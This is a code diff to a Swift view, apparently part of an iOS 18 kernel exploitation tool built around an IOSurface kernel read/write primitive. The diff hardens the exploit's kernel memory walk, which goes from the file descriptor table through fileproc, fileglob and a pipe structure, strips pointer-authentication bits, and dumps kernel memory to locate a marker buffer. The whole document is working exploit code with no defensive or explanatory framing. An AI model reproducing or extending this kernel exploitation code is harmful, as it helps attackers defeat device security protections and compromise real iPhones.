@@ -372,26 +372,26 @@ struct BleedingEdgeIOSurfaceKRWView: View {
         // fd_ofiles is array of fileproc pointers, indexed by fd number
         // On iOS 18, fileproc pointers may be packed differently
         // Each entry is 8 bytes (pointer to fileproc)
-        let fprocPtr = ds_kread64(ofilesPtr + UInt64(readFD) * 8)
+        let fprocPtr = ds_kread64_safe(ofilesPtr + UInt64(readFD) * 8)
         let fproc = fprocPtr | pac_mask  // Strip PAC
         report += String(format: "fileproc[%d]: 0x%llx (raw: 0x%llx)\n", readFD, fproc, fprocPtr)
         
-        guard ds_isvalid(fproc) else {
-            report += "fileproc invalid, trying write fd...\n"
-            let fprocPtr2 = ds_kread64(ofilesPtr + UInt64(writeFD) * 8)
-            let fproc2 = fprocPtr2 | pac_mask
-            report += String(format: "fileproc[%d]: 0x%llx\n", writeFD, fproc2)
+        guard fproc != pac_mask && ds_isvalid(fproc) else {
+            report += "fileproc invalid — fd_ofiles format may differ on iOS 18.\n"
+            report += "Trying alternative: read fileproc without PAC strip...\n"
+            let rawFproc = ds_kread64_safe(ofilesPtr + UInt64(readFD) * 8)
+            report += String(format: "  raw: 0x%llx\n", rawFproc)
             close(readFD)
             close(writeFD)
             rootResult = report
             return
         }
         
-        let fglob = ds_kread64(fproc + UInt64(off_fileproc_fp_glob))
+        let fglob = ds_kread64_safe(fproc + UInt64(off_fileproc_fp_glob))
         let fg = fglob | pac_mask
         report += String(format: "fp_glob:   0x%llx\n", fg)
         
-        guard ds_isvalid(fg) else {
+        guard fg != pac_mask && ds_isvalid(fg) else {
             report += "fileglob invalid\n"
             close(readFD)
             close(writeFD)
@@ -399,11 +399,11 @@ struct BleedingEdgeIOSurfaceKRWView: View {
             return
         }
         
-        let pipeStruct = ds_kread64(fg + UInt64(off_fileglob_fg_data))
+        let pipeStruct = ds_kread64_safe(fg + UInt64(off_fileglob_fg_data))
         let pipeAddr = pipeStruct | pac_mask
         report += String(format: "pipe:      0x%llx\n\n", pipeAddr)
         
-        guard ds_isvalid(pipeAddr) else {
+        guard pipeAddr != pac_mask && ds_isvalid(pipeAddr) else {
             report += "pipe struct invalid\n"
             close(readFD)
             close(writeFD)
@@ -414,7 +414,7 @@ struct BleedingEdgeIOSurfaceKRWView: View {
         // Step 4: Dump pipe struct to find buffer address
         report += "=== PIPE STRUCT DUMP ===\n"
         for i in stride(from: 0, to: 0x60, by: 8) {
-            let val = ds_kread64(pipeAddr + UInt64(i))
+            let val = ds_kread64_safe(pipeAddr + UInt64(i))
             report += String(format: "  pipe+0x%02x: 0x%016llx\n", i, val)
         }
         
@@ -423,10 +423,12 @@ struct BleedingEdgeIOSurfaceKRWView: View {
         report += "\n=== SEARCHING FOR MARKER IN PIPE ===\n"
         var bufferAddr: UInt64 = 0
         for i in stride(from: 0, to: 0x60, by: 8) {
-            let ptr = ds_kread64(pipeAddr + UInt64(i))
+            let ptr = ds_kread64_safe(pipeAddr + UInt64(i))
+            if ptr == 0 { continue }
             let stripped = ptr | pac_mask
+            if stripped == pac_mask { continue }
             if ds_isvalid(stripped) && stripped != pipeAddr {
-                let val = ds_kread64(stripped)
+                let val = ds_kread64_safe(stripped)
                 if val == marker {
                     bufferAddr = stripped
                     report += String(format: "  FOUND buffer at pipe+0x%02x → 0x%llx\n", i, stripped)
